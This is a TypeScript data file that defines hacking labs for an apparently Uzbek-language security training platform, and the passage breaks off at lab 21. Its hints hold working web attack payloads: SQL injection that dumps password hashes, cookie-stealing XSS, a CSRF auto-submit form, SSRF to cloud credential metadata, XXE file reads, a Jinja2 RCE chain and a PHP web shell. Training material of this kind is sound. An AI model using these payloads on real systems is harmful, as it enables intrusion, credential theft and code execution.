export interface LabDefinition {
  id: number;
  slug: string;
  title: string;
  targetApp: string;
  entryPoint: string;
  category: 
    | 'SQL_INJECTION' 
    | 'XSS' 
    | 'CSRF' 
    | 'IDOR' 
    | 'SSRF' 
    | 'XXE' 
    | 'SSTI' 
    | 'PATH_TRAVERSAL' 
    | 'FILE_UPLOAD' 
    | 'AUTHENTICATION' 
    | 'JWT' 
    | 'CORS' 
    | 'OPEN_REDIRECT' 
    | 'SECURITY_HEADERS' 
    | 'BUSINESS_LOGIC' 
    | 'RACE_CONDITION' 
    | 'API_SECURITY' 
    | 'GRAPHQL' 
    | 'WEBSOCKET' 
    | 'COMMAND_INJECTION' 
    | 'LINUX' 
    | 'FORENSICS' 
    | 'OSINT' 
    | 'NETWORK' 
    | 'CTF' 
    | 'ASSESSMENT';
  difficulty: 'Beginner' | 'Easy' | 'Medium' | 'Hard' | 'Expert';
  xp: number;
  estimatedMinutes: number;
  isPremium: boolean;
  description: string;
  briefing: string;
  objectives: Array<{
    id: number;
    title: string;
    description: string;
    autoKey?: string;
  }>;
  hints: Array<{
    level: number;
    title: string;
    penalty: number;
    content: string;
  }>;
}

export const LABS_DATA: LabDefinition[] = [
  // 1-4: SQL Injection
  {
    id: 1,
    slug: 'sqli-login',
    title: 'SQLi Login',
    targetApp: 'CyberBooks',
    entryPoint: '/login',
    category: 'SQL_INJECTION',
    difficulty: 'Beginner',
    xp: 100,
    estimatedMinutes: 20,
    isPremium: false,
    description: "CyberBooks tizimining kirish formasi SQL Injection zaifligiga ega. Administrator hisobiga parolsiz kirishni amalga oshiring.",
    briefing: "Foydalanuvchi kiritayotgan email maydoni parametrlashtirilmagan SQL so'roviga to'g'ridan-to'g'ri ulanmoqda: `SELECT * FROM users WHERE email = '...' AND password = '...'`. Boolean asosidagi SQL injection orqali shartni har doim `true` qilib tizimga kiring.",
    objectives: [
      { id: 1, title: "Zaiflikni aniqlash", description: "Login formasida maxsus belgi (') kiritib SQL xatoligini qo'zg'ating", autoKey: "sqli_error" },
      { id: 2, title: "Autentifikatsiyani aylanib o'tish", description: "' OR '1'='1 payloadini qo'llab parolsiz tizimga kiring", autoKey: "sqli_bypass" },
      { id: 3, title: "Admin panelga kirish", description: "Admin boshqaruv paneliga o'tib maxfiy flagni qo'lga kiriting", autoKey: "sqli_admin_flag" }
    ],
    hints: [
      { level: 1, title: "Tahlil", penalty: 10, content: "Kirish formasida email inputiga bitta yakka tirnoq (') qo'yib ko'ring." },
      { level: 2, title: "Mantiq", penalty: 20, content: "SQL so'rovini bekor qilish uchun ' OR 1=1 -- yoki ' OR '1'='1 sintaksisidan foydalaning." },
      { level: 3, title: "Payload", penalty: 30, content: "admin@cyberbooks.uz' -- yoki ' OR '1'='1 deb kiriting." }
    ]
  },
  {
    id: 2,
    slug: 'sqli-search',
    title: 'SQLi Search',
    targetApp: 'CyberBooks',
    entryPoint: '/search',
    category: 'SQL_INJECTION',
    difficulty: 'Beginner',
    xp: 120,
    estimatedMinutes: 25,
    isPremium: false,
    description: "CyberBooks qidiruv tizimidagi SQLi zaifligini ekspluatatsiya qilib, yashirin kitoblar va ma'lumotlarni chiqaring.",
    briefing: "Qidiruv maydoni `LIKE '%query%'` so'rovi orqali ishlaydi. Qidiruvni sindirib, maxfiy nashrlarni oching.",
    objectives: [
      { id: 1, title: "Qidiruv parametrini tekshirish", description: "?q= parametrida SQL sintaksis xatosini aniqlang", autoKey: "sqli_search_probe" },
      { id: 2, title: "Yashirin kitoblarni chiqarish", description: "UNION SELECT yoki OR 1=1 yordamida status='draft' kitoblarni ko'ring", autoKey: "sqli_search_drafts" },
      { id: 3, title: "Audit flagini oling", description: "Yashirin kitob ichidagi maxfiy flagni nusxalang", autoKey: "sqli_search_flag" }
    ],
    hints: [
      { level: 1, title: "Yo'llanma", penalty: 10, content: "Qidiruv maydoniga test%' OR 1=1 -- kiritib ko'ring." },
      { level: 2, title: "Ustunlar", penalty: 20, content: "ORDER BY 1, 2, 3 orqali jadvaldagi ustunlar sonini aniqlang." },
      { level: 3, title: "Eksploit", penalty: 30, content: "' UNION SELECT 1, title, description, 4 FROM hidden_books --" }
    ]
  },
  {
    id: 3,
    slug: 'sqli-product-filter',
    title: 'SQLi Product Filter',
    targetApp: 'CyberBooks',
    entryPoint: '/books',
    category: 'SQL_INJECTION',
    difficulty: 'Easy',
    xp: 130,
    estimatedMinutes: 30,
    isPremium: false,
    description: "Kitoblar toifasi filtri (category param) orqali SQL Injection uyushtiring.",
    briefing: "URL dagi `/books?category=tech` parametri tekshirilmagan. Ushbu parametr orqali SQL xatoliklarini yashiruvchi tizimdan ma'lumotlarni suzib oling.",
    objectives: [
      { id: 1, title: "Toifa filtrini tahlil qilish", description: "URL parametriga injection kiritib javobni taqqoslang", autoKey: "sqli_cat_probe" },
      { id: 2, title: "Barcha toifalarni ochish", description: "Barcha toifalardagi mahsulotlarni bir vaqtda chiqaring", autoKey: "sqli_cat_dump" },
      { id: 3, title: "Maxfiy toifadagi flagni toping", description: "'VIP Arxiv' toifasidagi flagni toping", autoKey: "sqli_cat_flag" }
    ],
    hints: [
      { level: 1, title: "URL", penalty: 10, content: "category=tech' OR 1=1-- tarzida parametr yuboring." },
      { level: 2, title: "Filter", penalty: 20, content: "URL encoding qiling: tech'%20OR%201=1--" },
      { level: 3, title: "Payload", penalty: 30, content: "/books?category=' UNION SELECT null, secret_token, null FROM config--" }
    ]
  },
  {
    id: 4,
    slug: 'sqli-data-extraction',
    title: 'SQLi Data Extraction',
    targetApp: 'DataVault',
    entryPoint: '/search',
    category: 'SQL_INJECTION',
    difficulty: 'Medium',
    xp: 180,
    estimatedMinutes: 45,
    isPremium: true,
    description: "UNION SELECT asosidagi ilg'or SQL Injection orqali DataVault ma'lumotlar bazasining foydalanuvchilar jadvalini to'liq eksport qiling.",
    briefing: "DataVault qidiruv maydoni orqali `information_schema` jadvallarini so'rab, admin parollari xeshlarini qo'lga kiritishingiz kerak.",
    objectives: [
      { id: 1, title: "Ustunlar sonini aniqlash", description: "ORDER BY texnikasi yordamida natija ustunlari sonini toping", autoKey: "sqli_cols_found" },
      { id: 2, title: "Jadval nomlarini aniqlash", description: "information_schema.tables dan maxfiy jadvallarni toping", autoKey: "sqli_tables_dump" },
      { id: 3, title: "Admin paroli xeshini ajratib olish", description: "users jadvalidan admin login va flag-xeshini oling", autoKey: "sqli_hash_extracted" }
    ],
    hints: [
      { level: 1, title: "Ustunlar", penalty: 15, content: "' ORDER BY 4-- ishlamay qolsa, 3 ta ustun bor." },
      { level: 2, title: "Schema", penalty: 25, content: "' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database()--" },
      { level: 3, title: "Jadval", penalty: 40, content: "' UNION SELECT 1, concat(username,':',password_hash), 3 FROM users--" }
    ]
  },

  // 5-8: XSS
  {
    id: 5,
    slug: 'reflected-xss',
    title: 'Reflected XSS',
    targetApp: 'CyberSearch',
    entryPoint: '/search',
    category: 'XSS',
    difficulty: 'Beginner',
    xp: 100,
    estimatedMinutes: 20,
    isPremium: false,
    description: "Qidiruv so'rovi sahifada to'g'ridan-to'g'ri aks etuvchi CyberSearch tizimida Reflected XSS zaifligini toping va tasdiqlang.",
    briefing: "Foydalanuvchi kiritgan so'z sahifada `Siz qidirgan so'z: {query}` ko'rinishida filtrlanmasdan ko'rsatiladi. `alert(document.domain)` chaqiring.",
    objectives: [
      { id: 1, title: "XSS nuqtasini aniqlash", description: "Qidiruv maydonida HTML teglari (<b>test</b>) qabul qilinishini tekshiring", autoKey: "xss_probe" },
      { id: 2, title: "JavaScript kodini ishga tushirish", description: "<script>alert(1)</script> yoki onerror hodisasi bilan oynani chaqiring", autoKey: "xss_alert" },
      { id: 3, title: "PoC havolasini tayyorlash", description: "Zaiflik aks etgan maxsus URL manzilini botga yuboring", autoKey: "xss_poc_sent" }
    ],
    hints: [
      { level: 1, title: "Test", penalty: 10, content: "Oddiy HTML teglar `<h1>Salom</h1>` ishlayotganini tekshiring." },
      { level: 2, title: "Payload", penalty: 20, content: "<script>alert(document.domain)</script>" },
      { level: 3, title: "Tegsiz", penalty: 30, content: "<img src=x onerror=alert(document.domain)>" }
    ]
  },
  {
    id: 6,
    slug: 'stored-xss-comments',
    title: 'Stored XSS Comments',
    targetApp: 'CyberForum',
    entryPoint: '/comments',
    category: 'XSS',
    difficulty: 'Easy',
    xp: 140,
    estimatedMinutes: 30,
    isPremium: false,
    description: "CyberForum izohlar tizimida saqlanuvchi (Stored) XSS zaifligini joylashtiring va boshqa foydalanuvchilar brauzerida kodni ijro eting.",
    briefing: "Izohlar ma'lumotlar bazasida saqlanadi va hamma tashrif buyuruvchilarga ko'rsatiladi. Filtr mavjud emas.",
    objectives: [
      { id: 1, title: "Xavfli izoh qoldirish", description: "Forumga JavaScript kodi yozilgan izoh yuboring", autoKey: "stored_xss_posted" },
      { id: 2, title: "Kodni avtomatik ishga tushirish", description: "Sahifa yangilanganda payload xatosiz ishga tushishini ta'minlang", autoKey: "stored_xss_exec" },
      { id: 3, title: "Admin botini tutib olish", description: "Admin izohni ko'rganda uning sessiya ma'lumotlarini qo'lga kiriting", autoKey: "stored_xss_bot_caught" }
    ],
    hints: [
      { level: 1, title: "Izoh", penalty: 10, content: "Izoh matniga to'g'ridan-to'g'ri `<script>alert(1)</script>` yozing." },
      { level: 2, title: "Filtr bo'lsa", penalty: 25, content: "`<svg onload=alert(1)>` kabi muqobil vektorlarni sinang." },
      { level: 3, title: "Cookie", penalty: 35, content: "`<script>fetch('/log?c='+document.cookie)</script>`" }
    ]
  },
  {
    id: 7,
    slug: 'stored-xss-profile',
    title: 'Stored XSS Profile',
    targetApp: 'CyberForum',
    entryPoint: '/profile',
    category: 'XSS',
    difficulty: 'Medium',
    xp: 170,
    estimatedMinutes: 35,
    isPremium: true,
    description: "Foydalanuvchi profili bio maydonidagi Stored XSS orqali CSRF hujumini zanjirlab amalga oshiring.",
    briefing: "Profil ma'lumotlaridagi 'Tarjimai hol' (Bio) maydoni filtrlanmaydi va barcha ko'ruvchilar uchun ochiq. Undan foydalanib admin hisobidan harakat bajaring.",
    objectives: [
      { id: 1, title: "Bio maydoniga payload kiritish", description: "Profilda XSS payloadini joylashtiring", autoKey: "profile_xss_saved" },
      { id: 2, title: "Ichki so'rov yuborish", description: "XSS orqali /api/user/change-email manziliga so'rov jo'nating", autoKey: "xss_csrf_chain" },
      { id: 3, title: "Admin vakolatini egallash", description: "Admin profilni ko'rganda uning emailini o'zgartiring va flagni oling", autoKey: "admin_takeover_flag" }
    ],
    hints: [
      { level: 1, title: "Joylashuv", penalty: 15, content: "Sozlamalar -> Profil -> Bio maydonini tekshiring." },
      { level: 2, title: "XHR", penalty: 25, content: "`<img src=x onerror=\"fetch('/api/admin/flag').then(r=>r.text()).then(t=>alert(t))\">`" },
      { level: 3, title: "To'liq", penalty: 35, content: "Script tegi ichida XMLHttpRequest yoki fetch yordamida harakat qiling." }
    ]
  },
  {
    id: 8,
    slug: 'dom-xss',
    title: 'DOM XSS',
    targetApp: 'CyberPortal',
    entryPoint: '/search',
    category: 'XSS',
    difficulty: 'Medium',
    xp: 180,
    estimatedMinutes: 40,
    isPremium: true,
    description: "Serverga so'rov bormasdan, brauzerning mijoz tomonidagi JavaScript kodi (document.location.hash) orqali DOM XSS zaifligini toping.",
    briefing: "Mijoz kodida `document.getElementById('result').innerHTML = location.hash.slice(1);` xavfli kodi mavjud. Hash fragmenti orqali DOM ni buzib o'ting.",
    objectives: [
      { id: 1, title: "Xavfli sink (sink) ni topish", description: "Brauzer manba kodida innerHTML yoki document.write ishlatilishini aniqlang", autoKey: "dom_sink_found" },
      { id: 2, title: "Hash orqali payload uzatish", description: "URL oxiridagi # belgisidan so'ng XSS kodini uzating", autoKey: "dom_hash_payload" },
      { id: 3, title: "DOM muhitida alert chaqirish", description: "Brauzerda DOM XSS orqali flagni ekranga chiqaring", autoKey: "dom_xss_flag" }
    ],
    hints: [
      { level: 1, title: "Fayl", penalty: 15, content: "Sahifaning app.js yoki inline scriptlarini tekshiring." },
      { level: 2, title: "Manzil", penalty: 25, content: "http://cyberportal.lab/search#<img src=1 onerror=alert(1)>" },
      { level: 3, title: "Bypass", penalty: 35, content: "Hash parametri brauzer tomonidan serverga yuborilmaydi, to'g'ridan-to'g'ri JS ga boradi." }
    ]
  },

  // 9: CSRF
  {
    id: 9,
    slug: 'csrf-profile',
    title: 'CSRF Profile',
    targetApp: 'SocialHub',
    entryPoint: '/profile',
    category: 'CSRF',
    difficulty: 'Easy',
    xp: 130,
    estimatedMinutes: 25,
    isPremium: false,
    description: "SocialHub profilida CSRF tokenining yo'qligidan foydalanib, foydalanuvchi nomidan yashirin so'rov yuboring.",
    briefing: "Profil emailini o'zgartiruvchi POST so'rovida anti-CSRF tokeni tekshirilmaydi va SameSite atributi None qilib belgilangan.",
    objectives: [
      { id: 1, title: "So'rov parametrlarini tahlil qilish", description: "Email o'zgarish so'rovining sarlavhalari va metodini yozib oling", autoKey: "csrf_req_analyzed" },
      { id: 2, title: "Zararli HTML sahifa yasash", description: "Avtomatik tarzda POST so'rov jo'natuvchi <form> tayyorlang", autoKey: "csrf_exploit_built" },
      { id: 3, title: "Foydalanuvchi emailini o'zgartirish", description: "Jabrlanuvchi tashrif buyurishi orqali uning emailini hacker@cybertrip.uz ga o'zgartiring", autoKey: "csrf_success" }
    ],
    hints: [
      { level: 1, title: "Token", penalty: 10, content: "So'rovda hech qanday csrf_token parametri bormi?" },
      { level: 2, title: "Form", penalty: 20, content: "`<form id='f' action='http://socialhub/profile/email' method='POST'><input name='email' value='hacker@test.uz'/></form><script>document.getElementById('f').submit()</script>`" },
      { level: 3, title: "Auto", penalty: 30, content: "Exploit serveriga formani joylang va qurbonga yuboring." }
    ]
  },

  // 10-11: IDOR
  {
    id: 10,
    slug: 'idor-documents',
    title: 'IDOR Documents',
    targetApp: 'SecureDocs',
    entryPoint: '/documents',
    category: 'IDOR',
    difficulty: 'Easy',
    xp: 150,
    estimatedMinutes: 25,
    isPremium: false,
    description: "SecureDocs hujjatlar boshqaruvida obyekt darajasidagi ruxsat tekshiruvi yetishmasligidan foydalanib, begona hujjatlarni o'qing.",
    briefing: "Foydalanuvchi o'z hujjati `GET /documents?id=1042` manzilida ochiladi. ID parametrini manipulyatsiya qilib direktorning hisobotini oling.",
    objectives: [
      { id: 1, title: "O'z hujjatingiz ID sini aniqlash", description: "URL parametrida ?id=1042 kelayotganini aniqlang", autoKey: "idor_id_found" },
      { id: 2, title: "ID parametrini almashtirish", description: "ID ni ketma-ket kamaytirib (1041, 1040... 1001) boshqa foydalanuvchilar ma'lumotlarini oching", autoKey: "idor_traversal" },
      { id: 3, title: "Direktorning maxfiy hujjati (#1001) ni o'qish", description: "Direktor hisobotidagi maxfiy flagni nusxalang", autoKey: "idor_flag_extracted" }
    ],
    hints: [
      { level: 1, title: "Parametr", penalty: 10, content: "URL dagi raqamni boshqa raqamga o'zgartirib ko'ring." },
      { level: 2, title: "Ruxsat", penalty: 20, content: "Server foydalanuvchi faqat o'ziga tegishli ID larni ko'rayotganini tekshiradimi?" },
      { level: 3, title: "Maqsad", penalty: 30, content: "?id=1001 ga murojaat qiling." }
    ]
  },
  {
    id: 11,
    slug: 'idor-orders',
    title: 'IDOR Orders',
    targetApp: 'OrderHub',
    entryPoint: '/orders',
    category: 'IDOR',
    difficulty: 'Medium',
    xp: 180,
    estimatedMinutes: 35,
    isPremium: true,
    description: "Buyurtmalar boshqaruvi tizimida UUID / Base64 bilan yashirilgan IDOR zaifligini toping va buyurtma holatini ruxsatsiz o'zgartiring.",
    briefing: "Buyurtma ID si `b3JkZXJfOTk0` (Base64) ko'rinishida yashirilgan. Uni deshifrlang va o'zgartiring.",
    objectives: [
      { id: 1, title: "Buyurtma identifikatorini tahlil qilish", description: "Base64 kodlangan buyurtma ID sini decode qiling", autoKey: "idor_b64_decoded" },
      { id: 2, title: "Admin buyurtmasini aniqlash", description: "order_1 ga mos yangi Base64 identifikatorini tuzing", autoKey: "idor_admin_order" },
      { id: 3, title: "Yetkazib berish manzilini o'zgartirish", description: "Admin buyurtmasiga o'z manzilingizni yozib tasdiqlang", autoKey: "idor_order_modified" }
    ],
    hints: [
      { level: 1, title: "Format", penalty: 15, content: "`b3JkZXJfOTk0` qiymatini atob() yoki cyberchef da oching." },
      { level: 2, title: "Natija", penalty: 25, content: "Bu `order_994`. Birinchi buyurtma nima bo'ladi? `order_1`" },
      { level: 3, title: "Encode", penalty: 35, content: "btoa('order_1') = `b3JkZXJfMQ==`" }
    ]
  },

  // 12: BOLA API
  {
    id: 12,
    slug: 'bola-api',
    title: 'BOLA API',
    targetApp: 'CyberAPI',
    entryPoint: '/api/docs',
    category: 'API_SECURITY',
    difficulty: 'Medium',
    xp: 220,
    estimatedMinutes: 40,
    isPremium: true,
    description: "OWASP API Top 10 ning 1-o'rnidagi Broken Object Level Authorization zaifligini REST API da ekspluatatsiya qiling.",
    briefing: "Swagger hujjatlaridan `/api/v1/users/{userId}/invoices` endpointini aniqlang va ruxsatsiz hisoblarni yuklab oling.",
    objectives: [
      { id: 1, title: "API hujjatlarini o'rganish", description: "Swagger / OpenAPI spetsifikatsiyasini tahlil qiling", autoKey: "bola_swagger_read" },
      { id: 2, title: "Boshqa mijoz tokeni bilan so'rov yuborish", description: "Tizimga oddiy foydalanuvchi sifatida kirib, userId=1 hisob-fakturasini chaqiring", autoKey: "bola_unauth_access" },
      { id: 3, title: "Kompaniya maxfiy hisobotini yuklab olish", description: "Kompaniya hisobotidagi flagni oling", autoKey: "bola_flag_obtained" }
    ],
    hints: [
      { level: 1, title: "Endpoint", penalty: 15, content: "/api/v1/invoices/99 va /api/v1/invoices/1" },
      { level: 2, title: "Header", penalty: 25, content: "Authorization: Bearer <your_token> sarlavhasi saqlanadi, lekin URI dagi ID o'zgartiriladi." },
      { level: 3, title: "BOLA", penalty: 35, content: "Server tokendagi ID bilan URL dagi ID ni solishtirishni unutgan." }
    ]
  },

  // 13-14: SSRF
  {
    id: 13,
    slug: 'ssrf-url-preview',
    title: 'SSRF URL Preview',
    targetApp: 'SitePreview',
    entryPoint: '/preview',
    category: 'SSRF',
    difficulty: 'Medium',
    xp: 220,
    estimatedMinutes: 40,
    isPremium: true,
    description: "Saytlarning skrinshotini oluvchi servis orqali ichki tarmoqqa (127.0.0.1:8080) so'rov yuboring.",
    briefing: "Foydalanuvchi kiritgan havola server tomonidan yuklab olinadi. Serverga `http://localhost/admin` manzilini berib, tashqi dunyoga yopiq sahifani oching.",
    objectives: [
      { id: 1, title: "SSRF nuqtasini aniqlash", description: "Server ixtiyoriy tashqi URL larga so'rov yuborayotganini tekshiring", autoKey: "ssrf_probe" },
      { id: 2, title: "Lokal xostni chaqirish", description: "http://127.0.0.1 yoki http://localhost orqali ichki servisga murojaat qiling", autoKey: "ssrf_localhost" },
      { id: 3, title: "Ichki admin panelidan flagni oling", description: "127.0.0.1 dagi ichki boshqaruv panelini yuklab oling", autoKey: "ssrf_admin_viewed" }
    ],
    hints: [
      { level: 1, title: "URL", penalty: 15, content: "Preview maydoniga http://127.0.0.1/ kiritib ko'ring." },
      { level: 2, title: "Port", penalty: 25, content: "Ichki admin paneli 8080 portda ishlamoqda: http://127.0.0.1:8080/admin" },
      { level: 3, title: "Bypass", penalty: 35, content: "127.0.0.1 bloklansa: 0.0.0.0, 127.1, yoki 2130706433 (decimal) ishlating." }
    ]
  },
  {
    id: 14,
    slug: 'ssrf-internal-service',
    title: 'SSRF Internal Service',
    targetApp: 'SitePreview',
    entryPoint: '/fetch',
    category: 'SSRF',
    difficulty: 'Hard',
    xp: 300,
    estimatedMinutes: 50,
    isPremium: true,
    description: "Ichki bulut metadata servisi (169.254.169.254) yoki ichki Redis/Memcached instansiyasiga SSRF orqali hujum qiling.",
    briefing: "Bulut muhitidagi serverning AWS/OpenStack metadata manzilidan IAM maxfiy kalitlarini tortib oling.",
    objectives: [
      { id: 1, title: "Metadata endpointini so'rash", description: "http://169.254.169.254/latest/meta-data/ manziliga so'rov yuboring", autoKey: "ssrf_meta_req" },
      { id: 2, title: "IAM Role ma'lumotlarini topish", description: "security-credentials/ papkasidagi rollarni ro'yxatlang", autoKey: "ssrf_iam_role" },
      { id: 3, title: "Secret Access Key ni qo'lga kiritish", description: "AWS kalitlari va maxfiy sessiya tokenini ajratib oling", autoKey: "ssrf_aws_keys" }
    ],
    hints: [
      { level: 1, title: "Bulut IP", penalty: 20, content: "Har bir bulut serverida 169.254.169.254 metadata manzili bor." },
      { level: 2, title: "Filtr", penalty: 35, content: "Agar 169.254... taqiqlangan bo'lsa, DNS rebind yoki URL redirector dan foydalaning." },
      { level: 3, title: "Yo'l", penalty: 50, content: "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role" }
    ]
  },

  // 15: XXE
  {
    id: 15,
    slug: 'xxe-report-import',
    title: 'XXE Report Import',
    targetApp: 'ReportManager',
    entryPoint: '/reports/upload',
    category: 'XXE',
    difficulty: 'Medium',
    xp: 220,
    estimatedMinutes: 40,
    isPremium: true,
    description: "XML formatidagi hisobot yuklash funksiyasida tashqi obyektlar (XXE) orqali serverdagi /etc/passwd faylini o'qing.",
    briefing: "XML parserida external entities (DTD) o'chirilmagan. `<!DOCTYPE test [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]>` payloadidan foydalaning.",
    objectives: [
      { id: 1, title: "XML yuklash funksiyasini tahlil qilish", description: "Tizim qabul qilayotgan XML fayl tuzilishini aniqlang", autoKey: "xxe_xml_analyzed" },
      { id: 2, title: "Tashqi Entity (DTD) kiritish", description: "XML fayl boshiga DOCTYPE deklaratsiyasini joylang", autoKey: "xxe_dtd_injected" },
      { id: 3, title: "/etc/passwd va maxfiy flagni o'qish", description: "Server hisobotida fayl tarkibini ko'ring va flagni oling", autoKey: "xxe_flag_read" }
    ],
    hints: [
      { level: 1, title: "DTD", penalty: 15, content: "`<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><report><title>&xxe;</title></report>`" },
      { level: 2, title: "Entity", penalty: 25, content: "&xxe; o'zgaruvchisini XML tegining matn qismiga joylashtiring." },
      { level: 3, title: "Fayl", penalty: 40, content: "file:///app/flag.txt manzilini ham tekshirib ko'ring." }
    ]
  },

  // 16-17: SSTI
  {
    id: 16,
    slug: 'ssti-template',
    title: 'SSTI Template',
    targetApp: 'InvoiceBuilder',
    entryPoint: '/templates',
    category: 'SSTI',
    difficulty: 'Medium',
    xp: 230,
    estimatedMinutes: 40,
    isPremium: true,
    description: "Hisob-faktura andozalarini sozlashda Jinja2 / Twig shablonlashtirish mexanizmidagi Server-Side Template Injection zaifligini aniqlang.",
    briefing: "Foydalanuvchi kiritgan `{{ 7 * 7 }}` ifodasi serverda 49 ga aylanmoqda. Shablon mexanizmini aniqlang va kod ijro eting.",
    objectives: [
      { id: 1, title: "SSTI mavjudligini tasdiqlash", description: "{{7*7}} yoki ${7*7} kiritib, 49 hisoblanayotganini ko'ring", autoKey: "ssti_math_confirmed" },
      { id: 2, title: "Shablon dvigatelini aniqlash", description: "Jinja2 (Python) ekanligini sinovlar orqali aniqlang", autoKey: "ssti_engine_jinja2" },
      { id: 3, title: "Tizim ma'lumotlarini ekranga chiqarish", description: "config yoki self obyekti orqali maxfiy SECRET_KEY ni oling", autoKey: "ssti_config_dump" }
    ],
    hints: [
      { level: 1, title: "Matematika", penalty: 15, content: "Matn maydoniga `Salom {{7*7}}` yozib saqlang va natijani ko'ring." },
      { level: 2, title: "Poliglots", penalty: 25, content: "${7*7}, {{7*'7'}}, <%= 7*7 %> - qaysi biri ishlayapti?" },
      { level: 3, title: "Jinja2", penalty: 40, content: "{{ config.items() }} yordamida ilova konfiguratsiyasini chiqaring." }
    ]
  },
  {
    id: 17,
    slug: 'ssti-advanced',
    title: 'SSTI Advanced',
    targetApp: 'InvoiceBuilder',
    entryPoint: '/invoices/create',
    category: 'SSTI',
    difficulty: 'Hard',
    xp: 320,
    estimatedMinutes: 55,
    isPremium: true,
    description: "Jinja2 shablonidan Python MRO (Method Resolution Order) zanjiri orqali chiqib, OS buyruqlarini (RCE) bajaring.",
    briefing: "`''.__class__.__mro__[1].__subclasses__()` orqali subprocess yoki os modulini chaqirib, serverda RCE ga erishing.",
    objectives: [
      { id: 1, title: "Subclasses ro'yxatini yuklash", description: "Python asosiy obyektidan mavjud barcha sinflarni chaqiring", autoKey: "ssti_mro_found" },
      { id: 2, title: "Popen yoki subprocess sinfini topish", description: "Buyruq bajaruvchi sinf indeksini aniqlang", autoKey: "ssti_popen_found" },
      { id: 3, title: "RCE orqali flag.txt ni o'qish", description: "`cat /flag.txt` buyrug'ini ishlatib yakuniy flagni oling", autoKey: "ssti_rce_flag" }
    ],
    hints: [
      { level: 1, title: "MRO", penalty: 20, content: "`{{ ''.__class__.__mro__ }}` qanday sinflar qaytarayotganini tekshiring." },
      { level: 2, title: "Index", penalty: 35, content: "`[c for c in ''.__class__.__base__.__subclasses__() if 'popen' in c.__name__.lower()]`" },
      { level: 3, title: "Exploit", penalty: 50, content: "`{{ ''.__class__.__mro__[1].__subclasses__()[396]('cat /flag.txt',shell=True,stdout=-1).communicate()[0] }}`" }
    ]
  },

  // 18-19: Path Traversal
  {
    id: 18,
    slug: 'path-traversal',
    title: 'Path Traversal',
    targetApp: 'FileManager',
    entryPoint: '/files',
    category: 'PATH_TRAVERSAL',
    difficulty: 'Easy',
    xp: 150,
    estimatedMinutes: 25,
    isPremium: false,
    description: "FileManager ilovasida `filename` parametrini manipulyatsiya qilib, katalog chegarasidan tashqariga chiqing.",
    briefing: "Fayl ochishda `../../../../etc/passwd` orqali tizim katalogiga o'tib, maxfiy konfiguratsiya faylini o'qing.",
    objectives: [
      { id: 1, title: "Nisbiy yo'lni sinash", description: "filename=../ fayl parametriga nuqta va qiya chiziq kiriting", autoKey: "pt_dot_tested" },
      { id: 2, title: "Katalogdan chiqish", description: "../../../../etc/passwd manziliga so'rov yuboring", autoKey: "pt_passwd_read" },
      { id: 3, title: "Ilova kodini o'qish", description: "filename=../../app/config.py orqali server kodini ko'ring", autoKey: "pt_source_read" }
    ],
    hints: [
      { level: 1, title: "Sintaksis", penalty: 10, content: "Har bir `../` bitta yuqori katalogga olib chiqadi." },
      { level: 2, title: "Chuqurlik", penalty: 20, content: "Katalog chuqurligini bilmasangiz, 6-8 marta `../../../../../../etc/passwd` qo'llang." },
      { level: 3, title: "Filtr", penalty: 30, content: "Agar `../` o'chirilsa: `....//....//etc/passwd` yoki `%2e%2e%2f` sinab ko'ring." }
    ]
  },
  {
    id: 19,
    slug: 'file-download-security',
    title: 'File Download Security',
    targetApp: 'FileManager',
    entryPoint: '/download',
    category: 'PATH_TRAVERSAL',
    difficulty: 'Medium',
    xp: 200,
    estimatedMinutes: 35,
    isPremium: true,
    description: "Null byte (%00) va URL encoding orqali `.pdf` kengaytmasini talab qiluvchi fayl yuklab olish filtrini aylanib o'ting.",
    briefing: "Ilova yuklab olinayotgan fayl faqat `.pdf` bo'lishini talab qiladi: `if not filename.endswith('.pdf')`. Null-byte yoki double-encoding orqali bypass qiling.",
    objectives: [
      { id: 1, title: "Kengaytma tekshiruvini aniqlash", description: "Nega faqat pdf fayllar ochilayotganini tahlil qiling", autoKey: "fd_ext_analyzed" },
      { id: 2, title: "Filtrni aylanib o'tish", description: "%00 yoki parameter pollution orqali boshqa fayllarni oching", autoKey: "fd_bypass_success" },
      { id: 3, title: "Server kalitini yuklab olish", description: "server.key faylini yuklab olib ichidagi flagni oling", autoKey: "fd_key_downloaded" }
    ],
    hints: [
      { level: 1, title: "Null Byte", penalty: 15, content: "`../../../../etc/passwd%00.pdf` eski tizimlarda matnni uzib qo'yadi." },
      { level: 2, title: "Double encode", penalty: 25, content: "`%252e%252e%252f` shaklida URL kodlashni qo'llang." },
      { level: 3, title: "Absolute path", penalty: 35, content: "Agar nisbiy yo'l bloklansa, to'g'ridan-to'g'ri `/etc/passwd` berib ko'ring." }
    ]
  },

  // 20: File Upload
  {
    id: 20,
    slug: 'file-upload',
    title: 'File Upload',
    targetApp: 'MediaVault',
    entryPoint: '/upload',
    category: 'FILE_UPLOAD',
    difficulty: 'Medium',
    xp: 220,
    estimatedMinutes: 40,
    isPremium: true,
    description: "Rasmlar yuklash funksiyasida Content-Type va fayl kengaytmasi filtrini aylanib o'tib, Web Shell (PHP/JSP) yuklang.",
    briefing: "Mijoz tomonidagi tekshiruv va serverdagi zaif MIME-type filtrini chetlab o'ting. Yuklangan shell orqali buyruq bajaring.",
    objectives: [
      { id: 1, title: "MIME-type tekshiruvini aylanib o'tish", description: "Content-Type: image/jpeg qilib soxtalashtiring", autoKey: "fu_mime_bypassed" },
      { id: 2, title: "Qo'shaloq kengaytma qo'llash", description: "shell.php.jpg yoki shell.phtml faylini yuklang", autoKey: "fu_shell_uploaded" },
      { id: 3, title: "Web shell orqali tizimni boshqarish", description: "Yuklangan fayl manzilini oching va flagni o'qing", autoKey: "fu_flag_executed" }
    ],
    hints: [
      { level: 1, title: "MIME", penalty: 15, content: "Burp Suite da Content-Type qiymatini `image/png` ga o'zgartiring." },
      { level: 2, title: "Kengaytma", penalty: 25, content: "Ko'p serverlar `.phtml`, `.php5` yoki `.phar` kengaytmalarini ham PHP deb qabul qiladi." },
      { level: 3, title: "Magic Bytes", penalty: 40, content: "Faylning birinchi baytlariga `GIF89a;` yozib, orqasidan `<?php system($_GET['cmd']); ?>` qo'shing." }
    ]
  },

  // 21-22: Authentication
  {
    id: 21,
    slug: 'auth-bypass-concepts',
    title: 'Authentication Bypass Concepts',
    targetApp: 'SecureAuth',
    entryPoint: '/login',
